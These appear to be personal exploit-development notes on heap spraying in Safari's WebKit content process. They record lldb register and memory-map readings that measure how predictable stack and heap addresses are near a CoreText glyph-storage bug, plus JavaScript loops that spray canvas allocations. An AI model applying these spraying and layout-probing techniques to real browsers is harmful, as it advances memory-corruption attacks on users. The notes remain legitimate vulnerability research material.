try to heap spray and see how predictable is the heap address

### 1a. without any spraying, sampling of distance between stack and trunglue

```
(lldbinit) p/x $rsi
(unsigned long) $4 = 0x00007ffee98cad60
(lldbinit) p/x $rsp
(unsigned long) $5 = 0x00007ffee98c9fb8
```

oops trunglue is alr on the stack

### 1b. without any spraying, sampling of distance between stack and tstoragerange

- `0x00000000c5f8e550`
- `0x0000004c78142db0`
- `0x00000046471cd490`
- `0x3575ec0520`

```
(lldbinit) p/x $rdi
(unsigned long) $14 = 0x00007ffe2393ae08
(lldbinit) vmmap $rdi
MALLOC_TINY              [0x00007FFE23900000 - 0x00007FFE23A00000) - rw-/rwx SM=PRV DefaultMallocZone_0x1077e9000
(lldbinit) p/x $rsp
(unsigned long) $17 = 0x00007ffee98c9358
(lldbinit) p/x $rsp-$rdi
(unsigned long) $18 = 0x00000000c5f8e550
```

`0x00000000c5f8e550`

```
(lldbinit) p/x $rsp
(unsigned long) $3 = 0x00007ffeedc61eb8
(lldbinit) p/x $rdi
(unsigned long) $4 = 0x00007fb275b1f108
(lldbinit) vmmap $rsp
vStack                    [0x00007FFEED4E5000 - 0x00007FFEEDCE5000) - rw-/rwx SM=PRV thread 0
(lldbinit) vmmap $rsi
__TEXT                      [0x0000000101F1B000 - 0x0000000101F1F000) - r-x/r-x SM=COW ...XPCServices/com.apple.WebKit.WebContent.xpc/Contents/MacOS/com.apple.WebKit.WebContent
(lldbinit) p/x $rsp-$rdi
(unsigned long) $10 = 0x0000004c78142db0
```

`0x0000004c78142db0`

```
(lldbinit) p/x $rsp
(unsigned long) $18 = 0x00007ffeeb602358
(lldbinit) p/x $rdi
(unsigned long) $19 = 0x00007fb8a4434ec8
(lldbinit) vmmap $rsp
Stack                    [0x00007FFEEAE86000 - 0x00007FFEEB686000) - rw-/rwx SM=PRV thread 0
(lldbinit) vmmap $rdi
MALLOC_TINY              [0x00007FB8A4400000 - 0x00007FB8A4500000) - rw-/rwx SM=PRV DefaultMallocZone_0x108fed000
(lldbinit) p/x $rsp-$rdi
(unsigned long) $24 = 0x00000046471cd490
```

`0x00000046471cd490`

```
rsp: 7ffee2f28eb8
rdi: 7fc96d068998
Stack                    [0x00007FFEE27AC000 - 0x00007FFEE2FAC000) - rw-/rwx SM=PRV thread 0
MALLOC_TINY              [0x00007FC96D000000 - 0x00007FC96D100000) - rw-/rwx SM=PRV DefaultMallocZone_0x10e18b000
rsp-rdi: 3575ec0520
```

```
rsp: 7ffeee192eb8
rdi: 7ff35c2303c8
Stack                    [0x00007FFEEDA16000 - 0x00007FFEEE216000) - rw-/rwx SM=PRV thread 0
MALLOC_TINY              [0x00007FF35C200000 - 0x00007FF35C300000) - rw-/rwx SM=PRV DefaultMallocZone_0x102f20000
rsp-rdi: b91f62af0
```

### 1c. Make sure it is same place for `[_CTNativeGlyphStorage setGlyph:atIndex:]`

```
rsp: 7ffee3d73e98
rdi: 7fedb2229c80
Stack                    [0x00007FFEE35F7000 - 0x00007FFEE3DF7000) - rw-/rwx SM=PRV thread 0
MALLOC_TINY              [0x00007FEDB2200000 - 0x00007FEDB2300000) - rw-/rwx SM=PRV DefaultMallocZone_0x10f6e9000
rsp-rdi: 1131b4a218
backing: 7fedb222d380
MALLOC_TINY              [0x00007FEDB2200000 - 0x00007FEDB2300000) - rw-/rwx SM=PRV DefaultMallocZone_0x10f6e9000
```

```
rsp: 7ffee249ce98
rdi: 7fc8e67257e0
Stack                    [0x00007FFEE1D20000 - 0x00007FFEE2520000) - rw-/rwx SM=PRV thread 0
MALLOC_TINY              [0x00007FC8E6700000 - 0x00007FC8E6800000) - rw-/rwx SM=PRV DefaultMallocZone_0x10e89c000
rsp-rdi: 35fbd776b8
backing: 7fc8e67263f0
MALLOC_TINY              [0x00007FC8E6700000 - 0x00007FC8E6800000) - rw-/rwx SM=PRV DefaultMallocZone_0x10e89c000
rsp-backing: 35fbd76aa8
backing-rdi: c10
```

```
rsp: 7ffee4e8be98
rdi: 7f8f26c3b120
Stack                    [0x00007FFEE470F000 - 0x00007FFEE4F0F000) - rw-/rwx SM=PRV thread 0
MALLOC_TINY              [0x00007F8F26C00000 - 0x00007F8F26D00000) - rw-/rwx SM=PRV DefaultMallocZone_0x10beac000
rsp-rdi: 6fbe250d78
backing: 7f8f26c3c050
MALLOC_TINY              [0x00007F8F26C00000 - 0x00007F8F26D00000) - rw-/rwx SM=PRV DefaultMallocZone_0x10beac000
rsp-backing: 6fbe24fe48
backing-rdi: f30
```

```
rsp: 7ffee7786e98
rdi: 7fcb0dd3d5d0
Stack                    [0x00007FFEE700A000 - 0x00007FFEE780A000) - rw-/rwx SM=PRV thread 0
MALLOC_TINY              [0x00007FCB0DD00000 - 0x00007FCB0DE00000) - rw-/rwx SM=PRV DefaultMallocZone_0x1095b0000
rsp-rdi: 33d9a498c8
backing: 7fcb0dd3e350
MALLOC_TINY              [0x00007FCB0DD00000 - 0x00007FCB0DE00000) - rw-/rwx SM=PRV DefaultMallocZone_0x1095b0000
rsp-backing: 33d9a48b48
backing-rdi: d80
```

```
rsp: 7ffeeee4be98
rdi: 7fd3de53f5f0
Stack                    [0x00007FFEEE6CF000 - 0x00007FFEEEECF000) - rw-/rwx SM=PRV thread 0
MALLOC_TINY              [0x00007FD3DE500000 - 0x00007FD3DE600000) - rw-/rwx SM=PRV DefaultMallocZone_0x1057aa000
rsp-rdi: 2b1090c8a8
backing: 7fd3de540250
MALLOC_TINY              [0x00007FD3DE500000 - 0x00007FD3DE600000) - rw-/rwx SM=PRV DefaultMallocZone_0x1057aa000
rsp-backing: 2b1090bc48
backing-rdi: c60
```

```
rsp: 7ffee79f3e98
rdi: 7fa50c119ec0
Stack                    [0x00007FFEE7277000 - 0x00007FFEE7A77000) - rw-/rwx SM=PRV thread 0
MALLOC_TINY              [0x00007FA50C100000 - 0x00007FA50C200000) - rw-/rwx SM=PRV DefaultMallocZone_0x108524000
rsp-rdi: 59db8d9fd8
backing: 7fa50c167c80
MALLOC_TINY              [0x00007FA50C100000 - 0x00007FA50C200000) - rw-/rwx SM=PRV DefaultMallocZone_0x108524000
rsp-backing: 59db88c218
backing-rdi: 4ddc0
```

:( the backing store is not even at constant offset from the `TStorageRange`

### 2. Try to get MALLOC_TINY to appear under the stack. Is this possible?

#### a. Create many canvas objects

```js
var bobross = []
for (var i = 0; i < 0x10000; ++i) {
    bobross.push(document.createElement('canvas'))
}
```

`0x10000`:

```
rsp: 7ffee9526e08
rdi: 7fc4d57342b0
Stack                    [0x00007FFEE8DAA000 - 0x00007FFEE95AA000) - rw-/rwx SM=PRV thread 0
MALLOC_TINY              [0x00007FC4D5700000 - 0x00007FC4D5800000) - rw-/rwx SM=PRV DefaultMallocZone_0x107814000
rsp-rdi: 3a13df2b58
backing: 7fc4d5735410
MALLOC_TINY              [0x00007FC4D5700000 - 0x00007FC4D5800000) - rw-/rwx SM=PRV DefaultMallocZone_0x107814000
rsp-backing: 3a13df19f8
backing-rdi: 1160
```

`0x100000`:

```
rsp: 7ffee6ea2e08
rdi: 7fa6a7f0ecc0
Stack                    [0x00007FFEE6726000 - 0x00007FFEE6F26000) - rw-/rwx SM=PRV thread 0
MALLOC_TINY              [0x00007FA6A7F00000 - 0x00007FA6A8000000) - rw-/rwx SM=PRV DefaultMallocZone_0x10a212000
rsp-rdi: 583ef94148
backing: 7fa6a7f4a3b0
MALLOC_TINY              [0x00007FA6A7F00000 - 0x00007FA6A8000000) - rw-/rwx SM=PRV DefaultMallocZone_0x10a212000
rsp-backing: 583ef58a58
backing-rdi: 3b6f0
```

still `0x100000`:

```
rsp: 7ffee74ede08
rdi: 7ff65102ae50
Stack                    [0x00007FFEE6D71000 - 0x00007FFEE7571000) - rw-/rwx SM=PRV thread 0
MALLOC_TINY              [0x00007FF651000000 - 0x00007FF651100000) - rw-/rwx SM=PRV DefaultMallocZone_0x10dcbb000
rsp-rdi: 8964c2fb8
backing: 7ff65102baf0
MALLOC_TINY              [0x00007FF651000000 - 0x00007FF651100000) - rw-/rwx SM=PRV DefaultMallocZone_0x10dcbb000
rsp-backing: 8964c2318
backing-rdi: ca0
```

looks like numbers beyond this will trigger the gc, which seems to affect my breakpoints

#### b. attempt #2, try to draw to the canvas with arabic text, dont store in array, see if gc will affect

```js
for (var i = 0; i < 0x10; ++i) {
    // var bobross = []
    for (var j = 0; j < 0x100000; ++j) {
        var canvas = document.createElement('canvas')
        var ctx = canvas.getContext('2d');
        ctx.fillText('你好吗习近平', 200, 200);
        // bobross.push(canvas)
        document.body.appendChild(canvas)
    }
    // bobrosses.push(bobross)
}
```

normal text so that dont trigger any morx ligature code

`0x100000` takes forever, it's a good sign, maybe

for `0x1000` canvases:

```
rsp: 7ffee89b0df8
rdi: 7f8d5c151c10
Stack                    [0x00007FFEE8234000 - 0x00007FFEE8A34000) - rw-/rwx SM=PRV thread 0
MALLOC_TINY              [0x00007F8D5C100000 - 0x00007F8D5C200000) - rw-/rwx SM=PRV DefaultMallocZone_0x1071e2000
rsp-rdi: 718c85f1e8
backing: 7f8d5c153070
MALLOC_TINY              [0x00007F8D5C100000 - 0x00007F8D5C200000) - rw-/rwx SM=PRV DefaultMallocZone_0x1071e2000
rsp-backing: 718c85dd88
backing-rdi: 1460
```

```
rsp: 7ffeeb7a3df8
rdi: 7fd758df68b0
Stack                    [0x00007FFEEB027000 - 0x00007FFEEB827000) - rw-/rwx SM=PRV thread 0
MALLOC_TINY              [0x00007FD758D00000 - 0x00007FD758E00000) - rw-/rwx SM=PRV DefaultMallocZone_0x105593000
rsp-rdi: 27929ad548
backing: 7fd758df7a70
MALLOC_TINY              [0x00007FD758D00000 - 0x00007FD758E00000) - rw-/rwx SM=PRV DefaultMallocZone_0x105593000
rsp-backing: 27929ac388
backing-rdi: 11c0
```

seems like need to draw something onto canvas for memory to be used

but there is a cap of 8192MB used by canvas (which makes sense too)